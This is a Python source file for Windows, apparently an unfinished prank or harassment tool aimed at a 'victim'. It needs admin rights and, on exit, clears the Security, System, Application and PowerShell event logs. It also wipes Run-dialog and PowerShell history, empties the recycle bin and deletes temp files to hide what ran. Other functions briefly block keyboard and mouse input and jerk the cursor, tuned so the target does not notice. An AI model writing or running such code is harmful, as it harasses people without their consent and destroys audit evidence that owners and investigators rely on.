# This has to be executed as admin
# Entry script should already handle this

import ctypes
import os

if not ctypes.WinDLL.shell32.IsUserAnAdmin():
    os._exit(1)


def cleanup():
    # LAzy load this stuff cause I won't use anywhere else
    import subprocess
    import winreg as reg
    
    # Clean up some stuff
    # WIN + R history
    with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, reg.KEY_SET_VALUE) as key:
        while True:
            try:
                i = 0
                reg.DeleteValue(key, reg.EnumValue(key, i)[0])
                i += 1
            except OSError:
                break
    # Clear event logs, recycle bin, PSReadline history, and temp files
    subprocess.run(['powershell.exe', '-Command', 'Clear-EventLog -LogName Application, System, Security, \"Windows PowerShell\"'], shell=True)
    subprocess.run(['powershell.exe', '-Command', 'Clear-RecycleBin -Confirm:$false'], shell=True)
    subprocess.run(['powershell.exe', '-Command', 'Remove-Item' '(Get-PSreadlineOption).HistorySavePath'], shell=True)
    subprocess.run(['cmd.exe', '/c', 'rmdir', '/s', '/q', '%localappdata%\\Temp'], shell=True)

import atexit
atexit.register(cleanup)


import pathlib
import time
import random
import subprocess
import threading


USER32 = ctypes.WinDLL('user32', use_last_error=True)


def misinput():
    """Ocassionally sends random input / blocks input to disrupt victim."""
    threading.Thread(target=block_input).start()
    threading.Thread(target=mouse_movement).start()



def funny_windows():
    """Make funny popup windows"""
    pass    


def mouse_movement():
    """Randomly move the mouse cursor around the screen."""
    # https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-mouse_event
    # No idea if this is done correctly
    for _ in range(3): # 3 should be enough to annoy them but not have them raise a fuss and look for the cause
        x = random.randint(-100, 100)
        y = random.randint(-100, 100)
        USER32.SetCursorPos(x, y)
        time.sleep(random.uniform(0.5, 2))  # Random delay between movements


def block_input():
    """Block input for a short time to confuse the user."""
    USER32.BlockInput(True)  
    time.sleep(random.random())  # Just long enough to mess with them but they don't realise
    USER32.BlockInput(False) 

def redirects():
    """Randomly redirects victim to be rickrolled"""
    pass

def main():
    pass

if __name__ == "__main__":
    main()